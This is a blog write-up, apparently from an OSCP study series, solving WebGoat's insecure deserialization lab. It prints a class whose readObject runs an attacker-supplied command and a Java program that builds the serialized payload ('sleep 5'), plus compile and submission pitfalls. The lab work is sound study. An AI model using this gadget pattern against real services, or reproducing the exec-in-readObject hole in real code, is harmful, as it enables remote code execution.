Title: Road to OSCP: WebGoat insecure deserialization challenge
Summary: A little writeup about insecure Java deserialization assignment
Date: 2020-03-05 16:00
Status: published
Category: OSCP
Tags: webgoat, websec, deserialization

The only practical assignment in A8 could be easily solved by anyone who worked with Java before, but I've stuck a little mostly because I'm not familiar with Java at all. To properly land attack on insecure deserialization we need to know some type with insecure method. As far as there aren't any types given in task definition and nothing points to that we should extract it some way, it was assumed that there is `VulnerableTaskHolder` used. This class was presented in a lesson before and looks like this:

```java
package org.dummy.insecure.framework;

import java.io.*;
import java.time.LocalDateTime;

public class VulnerableTaskHolder implements Serializable {

        private static final long serialVersionUID = 1;
        private String taskName;
        private String taskAction;
        private LocalDateTime requestedExecutionTime;

        public VulnerableTaskHolder(String taskName, String taskAction) {
                super();
                this.taskName = taskName;
                this.taskAction = taskAction;
                this.requestedExecutionTime = LocalDateTime.now();
        }

        private void readObject( ObjectInputStream stream ) throws Exception {
                stream.defaultReadObject();
                Runtime.getRuntime().exec(taskAction);
     }
}
```

So the `readObject` method is obviously flawed in context of this task, because it could run any command line that could be coming in from untrusted actor since class is serializable. All I have to do is to write such a snippet that does the following:

  1. Contain exact same definition of `VulnerableTaskHolder`
  2. Creates an instance of it with such a command that cause delay for 5 seconds (task goal)
  3. Serialize that instance to file

After we have to base64 encode content of output and provide it to the WebGoat. A no-brainer for the one who's written something more that hello world in Java. Unfortunately it wasn't me. Such pitfalls were here:

  1. It seems like you can't combine some task definition and main method in one file. There some errors about that `VulnerableTaskHolder` should be defined in corresponding file named after it
  2. Package name is crucial, `VulnerableTaskHolder` should be in package `org.dummy.insecure.framework`
  3. File with `VulnerableTaskHolder` definition should be located in proper directory, in our case it's `./org/dummy/insecure/framework`. It was assumed so and assumption was right. Otherwise I wasn't able to import class from that package in 'main' java app, even with `-classpath` argument provided. I really giggled here, because this assumption came from reminiscence of funny [Enterprise](https://github.com/joaomilho/Enterprise) 'programming' language
  4. Not a Java quirk but my environment's misconfiguration - machine time zone seemed to be UTC+00:00 but WebGoat was running with UTC+03:00 so it refused to proceed with some of the 'exploits'. Just added three hours difference to `requestedExecutionTime`

When all of the mentioned cases were identified solution turned to be pretty simple. Put `VulnerableTaskHolder` to `./org/dummy/insecure/framework`, put main program to `.`, compile with javac and run with java. Here is the main program:
```java
import java.io.*;
import java.time.LocalDateTime;
import org.dummy.insecure.framework.VulnerableTaskHolder;

public class Program {
	public static void main(String[] args) throws FileNotFoundException, IOException, ClassNotFoundException {
		String serFile = args[0];
		System.out.println("Serfile is " + serFile);
		FileOutputStream f = new FileOutputStream(serFile);
		ObjectOutputStream stream = new ObjectOutputStream(f);
		VulnerableTaskHolder o = new VulnerableTaskHolder("wait", "sleep 5");
		stream.writeObject(o);
		stream.close();
		f.close();
	}
}
```

No luck. It was told that `serialVersionUID` has been bumped to newer version. OK, change to two, try again and finally complete the task.
